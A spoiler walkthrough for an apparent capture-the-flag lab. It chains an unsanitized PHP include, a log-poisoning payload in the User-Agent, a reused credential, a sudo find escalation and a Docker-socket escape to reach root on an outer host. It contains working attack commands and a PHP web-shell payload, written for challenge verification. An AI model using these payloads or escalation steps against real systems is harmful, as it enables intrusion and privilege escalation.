# Walkthrough (spoiler)

This is the intended solution path. It is a spoiler for maintainers and for
verifying the challenge. Do not read it if you want to play.

Target ports (default mapping): 8080 web, 22 outer-host SSH, 23 web-container
SSH.

## Stage 0 - Recon

- Browse `http://TARGET:8080/`. The site is a small marketing page whose links
  look like `index.php?page=about.php`, so navigation is a file-include router.
- `http://TARGET:8080/robots.txt` disallows `/config.php` and leaves a comment
  admitting the `?page=` router still includes whatever it is given, straight
  off disk.

## Stage 1 - Local File Inclusion

- `index.php` does `include($_GET['page'])` with no sanitization.
- Confirm with a known file:
  `curl 'http://TARGET:8080/index.php?page=/etc/passwd'` returns the passwd file
  and shows the `milo` and `www-data` accounts.
- The application source is readable through a php filter wrapper, for example
  `index.php?page=php://filter/convert.base64-encode/resource=config.php`. This is
  a legitimate LFI shortcut: base64-decoding the result discloses `config.php`
  including milo's reused credential, without any RCE. The log-poisoning RCE below
  is the intended teaching primitive, but this direct read reaches the same
  credential.

## Stage 2 - Log poisoning to RCE (www-data)

- Apache runs mod_php as `www-data`, and `www-data` is in the `adm` group, so it
  can read `/var/log/apache2/access.log`. Every request's User-Agent is logged
  there verbatim.
- Poison the log with a PHP payload in the User-Agent. The payload must use
  single quotes inside the PHP: Apache's combined log format wraps the
  User-Agent in double quotes and backslash-escapes any double quote inside it,
  which would corrupt a `$_GET["c"]` payload into a parse error. Single quotes
  are logged verbatim:

  ```bash
  curl -A "<?php system(\$_GET['c']); ?>" 'http://TARGET:8080/'
  ```

  The shell double quotes keep the single quotes on the wire; the `\$` stops the
  shell expanding `$_GET`. Any request that logs a valid `<?php ... ?>` works.
- Note: PHP parses the whole included file, so one malformed `<?php` earlier in
  the log aborts the include with a parse error. Inject a single well-formed
  payload on a fresh instance.
- Include the log through the LFI and pass the command in `c`:

  ```bash
  curl 'http://TARGET:8080/index.php?page=/var/log/apache2/access.log&c=id'
  ```

  This runs as `www-data`.
- Read the first flag:
  `curl 'http://TARGET:8080/index.php?page=/var/log/apache2/access.log&c=cat%20/var/www/web-user.txt'`
  gives the `FLAG{...}` web-user flag.
- Known LFI shortcut: the web-user flag file is owned by `www-data` and contains
  no PHP tags, so the same unfiltered LFI includes it directly and prints it,
  without poisoning any log:
  `curl 'http://TARGET:8080/index.php?page=/var/www/web-user.txt'`.
  Because `www-data` is both the LFI identity and the RCE identity, a same-user
  flag is inherently include-readable; the RCE above is the intended teaching
  point, not a hard gate for this flag.

## Stage 3 - www-data to milo (reused credential)

- From the RCE, read the webroot config:
  `.../access.log&c=cat%20/var/www/html/config.php` discloses
  `$DB_USER='milo'` and `$DB_PASS='8EPYJySLj0JkertR'`, with a comment that milo
  reuses this as his system login.
- `ssh milo@TARGET -p 23` with that password (the web container SSH is published
  on 23).
- `cat ~/milo.txt` gives the second `FLAG{...}`.

## Stage 4 - milo to container root (sudo find)

- `sudo -l` shows `milo` may run `/usr/bin/find` as root with NOPASSWD.
- `sudo find /etc/hostname -exec /bin/sh \; -quit` (GTFOBins) gives a root shell
  in the web container.
- `cat /root/web-root.txt` gives the `WEB_FLAG{...}` flag.

## Stage 5 - Out to the outer host

Two outer flags, both `MAIN_FLAG{...}`.

### 5a - Outer user via the recovered deploy key

- As milo, `~/notes-milo.txt` says production is reached over SSH as `victor`
  using `~/.ssh/deploy_key`.
- From your own machine, pull the key out (for example over the milo SSH
  session) and use it:

  ```bash
  ssh -i deploy_key victor@TARGET -p 22
  cat ~/user.txt
  ```

  gives the outer-host user `MAIN_FLAG{...}`.

### 5b - Outer root via the exposed Docker socket

- As root in the web container, note `/var/run/docker.sock` is mounted (it is
  the outer host engine).
- A static `docker` client is present. Launch a container that mounts the outer
  host filesystem and read the flag:

  ```bash
  docker run --rm -v /:/host php:8.4-apache cat /host/root/root.txt
  ```

- That prints the final outer-host root `MAIN_FLAG{...}`. `php:8.4-apache` is the
  inner web image's own base, so the outer engine already holds it from the inner
  build and this step needs no network. Any image already present in the outer
  engine works; do not reach for one that has to be pulled at solve time.

## Notes and red herrings

- The unfiltered LFI supports two direct reads that skip the RCE entirely: the
  `php://filter` wrapper discloses `config.php` (milo's credential), and a plain
  include of `/var/www/web-user.txt` prints the `www-data` flag (a same-user file
  with no PHP tags). The log-poisoning RCE is the intended teaching point, not a
  hard requirement for any flag; document it as such rather than claiming it is
  enforced.
- `victor`'s outer-host password is a random high-entropy value, not a hint; the
  intended login is the recovered deploy key.
- The deploy key is the only credential that reaches `victor`; the Docker socket
  is the only route to outer root. Neither shortcuts the other.
